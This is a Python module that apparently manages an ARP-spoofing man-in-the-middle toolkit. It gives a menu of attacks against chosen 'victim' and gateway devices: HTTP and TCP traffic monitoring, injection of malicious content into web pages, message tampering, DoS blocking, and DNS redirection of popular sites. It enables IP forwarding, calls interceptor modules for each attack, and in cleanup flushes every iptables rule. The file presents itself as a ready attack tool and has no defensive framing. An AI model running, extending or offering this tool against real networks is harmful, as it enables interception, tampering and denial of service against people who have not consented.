#!/usr/bin/env python3
"""
Attack Manager for Unified ARP Spoofing & MITM System
Manages all attack types and their configuration/execution
"""

import sys
import os
import signal
import subprocess
import logging
from enum import Enum
from colorama import Fore, Style

from common.utils import (
    clear_screen, print_section_header, get_user_choice, format_device_info,
    confirm_action, print_info, print_error, print_success, print_warning
)
from common.arp_poison import ARPPoisoner

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class AttackType(Enum):
    """Enumeration of all available attack types"""
    HTTP_MONITOR = "http_monitor"
    HTTP_TAMPER = "http_tamper"  
    HTTP_DROP = "http_drop"
    TCP_MONITOR = "tcp_monitor"
    TCP_TAMPER = "tcp_tamper"
    TCP_DROP = "tcp_drop"
    DNS_INTERCEPT = "dns_intercept"

class AttackManager:
    """Manages attack selection, configuration, and execution"""
    
    def __init__(self, devices, device_loader=None):
        self.devices = devices
        self.device_loader = device_loader  # Store reference to device loader
        self.attack_configs = {
            AttackType.HTTP_MONITOR: {
                'name': 'HTTP Traffic Monitoring',
                'description': 'Monitor and log HTTP traffic without modification',
                'icon': '👁️',
                'color': Fore.BLUE,
                'roles': ['victim', 'gateway'],
                'requirements': {
                    'required_roles': ['victim', 'gateway'],
                    'allow_duplicate_devices': False
                }
            },
            AttackType.HTTP_TAMPER: {
                'name': 'HTTP Content Injection',
                'description': 'Inject malicious content into HTTP responses',
                'icon': '🔧',
                'color': Fore.RED,
                'roles': ['victim', 'gateway'],
                'requirements': {
                    'required_roles': ['victim', 'gateway'],
                    'allow_duplicate_devices': False
                }
            },
            AttackType.HTTP_DROP: {
                'name': 'HTTP Traffic Blocking',
                'description': 'Block all HTTP traffic (DoS attack)',
                'icon': '🚫',
                'color': Fore.MAGENTA,
                'roles': ['victim', 'gateway'],
                'requirements': {
                    'required_roles': ['victim', 'gateway'],
                    'allow_duplicate_devices': False
                }
            },
            AttackType.TCP_MONITOR: {
                'name': 'TCP Socket Monitoring',
                'description': 'Monitor TCP communications between two devices',
                'icon': '👀',
                'color': Fore.CYAN,
                'roles': ['device_1', 'device_2', 'gateway'],
                'requirements': {
                    'required_roles': ['device_1', 'device_2', 'gateway'],
                    'allow_duplicate_devices': False
                }
            },
            AttackType.TCP_TAMPER: {
                'name': 'TCP Message Tampering',
                'description': 'Intercept and modify TCP messages between devices',
                'icon': '✂️',
                'color': Fore.YELLOW,
                'roles': ['device_1', 'device_2', 'gateway'],
                'requirements': {
                    'required_roles': ['device_1', 'device_2', 'gateway'],
                    'allow_duplicate_devices': False
                }
            },
            AttackType.TCP_DROP: {
                'name': 'TCP Communication Blocking',
                'description': 'Block TCP communications between devices',
                'icon': '❌',
                'color': Fore.RED,
                'roles': ['device_1', 'device_2', 'gateway'],
                'requirements': {
                    'required_roles': ['device_1', 'device_2', 'gateway'],
                    'allow_duplicate_devices': False
                }
            },
            AttackType.DNS_INTERCEPT: {
                'name': 'DNS Query Interception',
                'description': 'Intercept and redirect DNS queries',
                'icon': '🌐',
                'color': Fore.GREEN,
                'roles': ['target_1', 'target_2', 'gateway'],
                'requirements': {
                    'required_roles': ['target_1', 'target_2', 'gateway'],
                    'allow_duplicate_devices': False
                }
            }
        }
    
    def select_attack_type(self):
        """Allow user to select attack type"""
        print_info("Select the type of attack you want to perform:")
        print()
        
        # Display attack options
        attack_list = list(self.attack_configs.keys())
        
        for i, attack_type in enumerate(attack_list, 1):
            config = self.attack_configs[attack_type]
            print(f"  {Fore.BLUE}[{i:2d}]{Style.RESET_ALL} {config['color']}{config['icon']} {config['name']}{Style.RESET_ALL}")
            print(f"       {Fore.WHITE}{config['description']}{Style.RESET_ALL}")
            print(f"       {Fore.YELLOW}Requires: {', '.join(config['roles'])}{Style.RESET_ALL}")
            print()
        
        # Get user choice
        choice = get_user_choice(
            f"Select attack type (1-{len(attack_list)}) or 'q' to quit: ",
            attack_list
        )
        
        if choice is None:
            return None
        
        selected_attack = attack_list[choice]
        config = self.attack_configs[selected_attack]
        
        print(f"\n{config['color']}Selected: {config['icon']} {config['name']}{Style.RESET_ALL}")
        print(f"Description: {config['description']}")
        
        if not confirm_action("Proceed with this attack type?", default_yes=True):
            return self.select_attack_type()
        
        return selected_attack
    
    def configure_attack(self, attack_type):
        """Configure the selected attack with device roles"""
        config = self.attack_configs[attack_type]
        roles = config['roles']
        
        print_info(f"Configuring {config['name']}...")
        print_info(f"You need to select devices for the following roles:")
        
        for role in roles:
            print(f"  • {Fore.CYAN}{role.replace('_', ' ').title()}{Style.RESET_ALL}: Device to use for this role")
        
        print()
        
        if not confirm_action("Proceed with device selection?", default_yes=True):
            return None
        
        # Use the original scanner if available, otherwise create a new one
        if self.device_loader:
            loader = self.device_loader
        else:
            from device_loader import DeviceLoader
            loader = DeviceLoader()
            loader.device_list = self.devices
        
        # Select devices for each role
        selected_devices = loader.select_multiple_devices(roles)
        
        if not selected_devices:
            return None
        
        # Validate selection
        validation_errors = loader.validate_device_selection(
            selected_devices, 
            config['requirements']
        )
        
        if validation_errors:
            print_error("Device selection validation failed:")
            for error in validation_errors:
                print(f"  • {error}")
            
            if not confirm_action("Continue anyway?", default_yes=False):
                return None
        
        return {
            'attack_type': attack_type,
            'devices': selected_devices,
            'config': config
        }
    
    def execute_attack(self, attack_type, attack_config):
        """Execute the configured attack"""
        config = self.attack_configs[attack_type]
        devices = attack_config['devices']
        
        print_section_header(f"🚀 EXECUTING: {config['name'].upper()}", config['color'])
        
        # Display attack summary
        self.display_attack_summary(attack_config)
        
        if not confirm_action("Start the attack?", default_yes=True):
            print_warning("Attack cancelled by user")
            return
        
        # Setup IP forwarding
        self.enable_ip_forwarding()
        
        # Setup signal handler for cleanup
        def cleanup_handler(signum, frame):
            print(f"\n{Fore.YELLOW}🛑 Attack interrupted - cleaning up...{Style.RESET_ALL}")
            self.cleanup_attack()
            sys.exit(0)
        
        signal.signal(signal.SIGINT, cleanup_handler)
        
        try:
            # Execute based on attack type
            if attack_type in [AttackType.HTTP_MONITOR, AttackType.HTTP_TAMPER, AttackType.HTTP_DROP]:
                self.execute_http_attack(attack_type, devices)
            elif attack_type in [AttackType.TCP_MONITOR, AttackType.TCP_TAMPER, AttackType.TCP_DROP]:  
                self.execute_tcp_attack(attack_type, devices)
            elif attack_type == AttackType.DNS_INTERCEPT:
                self.execute_dns_attack(attack_type, devices)
            else:
                print_error(f"Unknown attack type: {attack_type}")
                return
                
        except KeyboardInterrupt:
            cleanup_handler(None, None)
        except Exception as e:
            print_error(f"Attack execution failed: {e}")
            self.cleanup_attack()
    
    def execute_http_attack(self, attack_type, devices):
        """Execute HTTP-based attacks"""
        victim = devices['victim']
        gateway = devices['gateway']
        
        # Map attack type to mode
        mode_mapping = {
            AttackType.HTTP_MONITOR: 'MONITOR',
            AttackType.HTTP_TAMPER: 'TAMPER', 
            AttackType.HTTP_DROP: 'DROP'
        }
        mode = mode_mapping[attack_type]
        
        print_info(f"Starting HTTP {mode} attack...")
        print_info(f"Victim: {victim['ip']} ({victim.get('hostname', 'Unknown')})")
        print_info(f"Gateway: {gateway['ip']} ({gateway.get('hostname', 'Unknown')})")
        
        # Import and run HTTP interceptor with parameters
        from http_interceptor import run_http_attack
        print_success("HTTP interceptor starting...")
        run_http_attack(victim, gateway, mode)
    
    def execute_tcp_attack(self, attack_type, devices):
        """Execute TCP-based attacks"""
        device_1 = devices['device_1']
        device_2 = devices['device_2']
        gateway = devices['gateway']
        
        # Map attack type to mode
        mode_mapping = {
            AttackType.TCP_MONITOR: 'MONITOR',
            AttackType.TCP_TAMPER: 'TAMPER',
            AttackType.TCP_DROP: 'DROP'
        }
        mode = mode_mapping[attack_type]
        
        print_info(f"Starting TCP {mode} attack...")
        print_info(f"Device 1: {device_1['ip']} ({device_1.get('hostname', 'Unknown')})")  
        print_info(f"Device 2: {device_2['ip']} ({device_2.get('hostname', 'Unknown')})")
        print_info(f"Gateway: {gateway['ip']} ({gateway.get('hostname', 'Unknown')})")
        
        # Import and run TCP interceptor with parameters
        from bidirectional_tcp_interceptor import run_tcp_attack
        print_success("TCP interceptor starting...")
        run_tcp_attack(device_1, device_2, gateway, mode)
    
    def execute_dns_attack(self, attack_type, devices):
        """Execute DNS attacks"""
        target_1 = devices['target_1']
        target_2 = devices['target_2'] 
        gateway = devices['gateway']
        
        print_info("Starting DNS interception attack...")
        print_info(f"Target 1: {target_1['ip']} ({target_1.get('hostname', 'Unknown')})")
        print_info(f"Target 2: {target_2['ip']} ({target_2.get('hostname', 'Unknown')})")
        print_info(f"Gateway: {gateway['ip']} ({gateway.get('hostname', 'Unknown')})")
        
        # Import and run DNS interceptor with parameters
        from dns_interceptor import run_dns_attack
        print_success("DNS interceptor starting...")
        run_dns_attack(target_1, target_2, gateway)
    
    def display_attack_summary(self, attack_config):
        """Display summary of the configured attack"""
        config = attack_config['config']
        devices = attack_config['devices']
        
        print(f"\n{config['color']}Attack: {config['icon']} {config['name']}{Style.RESET_ALL}")
        print(f"Description: {config['description']}")
        print(f"\n{Fore.CYAN}Device Configuration:{Style.RESET_ALL}")
        
        for role, device in devices.items():
            print(f"\n{Fore.YELLOW}{role.replace('_', ' ').title()}:{Style.RESET_ALL}")
            format_device_info(device)
        
        print(f"\n{Fore.GREEN}The attack will:{Style.RESET_ALL}")
        
        # Attack-specific information
        attack_type = attack_config['attack_type']
        if 'HTTP' in attack_type.value.upper():
            print(f"  • Set up ARP poisoning between victim and gateway")
            print(f"  • Intercept HTTP traffic on port 80")
            if 'MONITOR' in attack_type.value.upper():
                print(f"  • Log all HTTP requests and responses")
            elif 'TAMPER' in attack_type.value.upper():
                print(f"  • Inject malicious content into HTML pages")
            elif 'DROP' in attack_type.value.upper():
                print(f"  • Block all HTTP traffic (DoS)")
        
        elif 'TCP' in attack_type.value.upper():
            print(f"  • Set up bidirectional ARP poisoning")
            print(f"  • Intercept TCP socket communications")
            if 'MONITOR' in attack_type.value.upper():
                print(f"  • Log all TCP messages between devices")
            elif 'TAMPER' in attack_type.value.upper():
                print(f"  • Modify TCP messages in real-time")
            elif 'DROP' in attack_type.value.upper():
                print(f"  • Block all TCP communications")
        
        elif 'DNS' in attack_type.value.upper():
            print(f"  • Set up ARP poisoning for DNS interception")
            print(f"  • Redirect specific domains to alternative IPs")
            print(f"  • Target domains: YouTube, Facebook, Instagram, etc.")
    
    def enable_ip_forwarding(self):
        """Enable IP forwarding for MITM attacks"""
        try:
            print_info("Enabling IP forwarding...")
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            
            # Verify it was enabled
            with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
                if f.read().strip() == '1':
                    print_success("IP forwarding enabled")
                else:
                    print_warning("IP forwarding may not be enabled properly")
        except Exception as e:
            print_error(f"Failed to enable IP forwarding: {e}")
    
    def cleanup_attack(self):
        """Cleanup after attack"""
        print_info("Performing cleanup...")
        
        # Disable IP forwarding
        try:
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            print_success("IP forwarding disabled")
        except:
            print_warning("Could not disable IP forwarding")
        
        # Clear iptables rules
        try:
            os.system("iptables -F")
            print_success("iptables rules cleared")
        except:
            print_warning("Could not clear iptables rules")
        
        print_success("Cleanup completed")

def main():
    """Test the attack manager"""
    # Mock devices for testing
    test_devices = [
        {'ip': '192.168.0.1', 'mac': '00:11:22:33:44:55', 'hostname': 'router', 'vendor': 'Netgear', 'device_type': 'router'},
        {'ip': '192.168.0.100', 'mac': '00:11:22:33:44:56', 'hostname': 'laptop', 'vendor': 'Dell', 'device_type': 'laptop'},
        {'ip': '192.168.0.101', 'mac': '00:11:22:33:44:57', 'hostname': 'phone', 'vendor': 'Samsung', 'device_type': 'phone'}
    ]
    
    manager = AttackManager(test_devices)
    attack_type = manager.select_attack_type()
    
    if attack_type:
        attack_config = manager.configure_attack(attack_type)
        if attack_config:
            print("Attack configuration complete!")

if __name__ == "__main__":
    main() 